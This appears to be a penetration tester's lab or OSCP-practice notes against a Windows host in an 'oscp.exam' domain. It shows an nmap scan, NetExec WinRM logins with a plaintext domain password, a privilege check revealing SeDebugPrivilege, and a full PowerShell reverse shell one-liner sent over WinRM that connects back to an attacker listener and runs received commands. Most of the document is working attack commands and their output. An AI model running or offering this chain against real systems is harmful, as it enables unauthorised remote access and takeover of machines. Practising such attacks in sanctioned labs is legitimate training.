



![[Pasted image 20261003062225.png]]

```
──(bitsentry㉿kali)-[~/…/OSCP/exam_content/AD_DC/nmap]
└─$ sudo nmap -sC -sV -Pn 192.168.109.206 -o 109.200.nmap
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 06:09 -0400
Nmap scan report for oscp.exam (192.168.109.206)
Host is up (0.12s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Home - OffSec NIC
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
|_ssl-date: TLS randomness does not represent time
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Home - OffSec NIC
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-10-03T10:11:01+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: WS26
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: WS26.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.22000
|_  System_Time: 2026-10-03T10:10:20+00:00
| ssl-cert: Subject: commonName=WS26.oscp.exam
| Not valid before: 2026-07-16T21:17:41
|_Not valid after:  2027-01-15T21:17:41
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-03T10:10:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.72 seconds

```


![[Pasted image 20261003062032.png]]


```
┌──(bitsentry㉿kali)-[~/Documents/OSCP/exam_content/AD_DC]
└─$ nxc winrm 192.168.109.206 -u 'r.andrews' -p 'BusyOfficeWorker890' -d 'oscp.exam'         
WINRM       192.168.109.206 5985   WS26             [*] Windows 11 Build 22000 (name:WS26) (domain:oscp.exam) 
WINRM       192.168.109.206 5985   WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 (Pwn3d!)

```


```
┌──(bitsentry㉿kali)-[~]
└─$ nxc winrm 192.168.109.206 -u 'r.andrews' -p 'BusyOfficeWorker890' -d 'oscp.exam' -x 'whoami /priv'
WINRM       192.168.109.206 5985   WS26             [*] Windows 11 Build 22000 (name:WS26) (domain:oscp.exam) 
WINRM       192.168.109.206 5985   WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 (Pwn3d!)
WINRM       192.168.109.206 5985   WS26             [-] Execute command failed, current user: 'oscp.exam\r.andrews' has no 'Invoke' rights to execute command (shell type: cmd)
WINRM       192.168.109.206 5985   WS26             [+] Executed command (shell type: powershell)
WINRM       192.168.109.206 5985   WS26             
WINRM       192.168.109.206 5985   WS26             PRIVILEGES INFORMATION
WINRM       192.168.109.206 5985   WS26             ----------------------
WINRM       192.168.109.206 5985   WS26             
WINRM       192.168.109.206 5985   WS26             Privilege Name                Description                          State
WINRM       192.168.109.206 5985   WS26             ============================= ==================================== =======
WINRM       192.168.109.206 5985   WS26             SeShutdownPrivilege           Shut down the system                 Enabled
WINRM       192.168.109.206 5985   WS26             SeDebugPrivilege              Debug programs                       Enabled
WINRM       192.168.109.206 5985   WS26             SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
WINRM       192.168.109.206 5985   WS26             SeUndockPrivilege             Remove computer from docking station Enabled
WINRM       192.168.109.206 5985   WS26             SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
WINRM       192.168.109.206 5985   WS26             SeTimeZonePrivilege           Change the time zone                 Enabled

```


```
nxc winrm 192.168.109.206 -u 'r.andrews' -p 'BusyOfficeWorker890' -d 'oscp.exam' -x '$LHOST = "192.168.49.109"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
   

```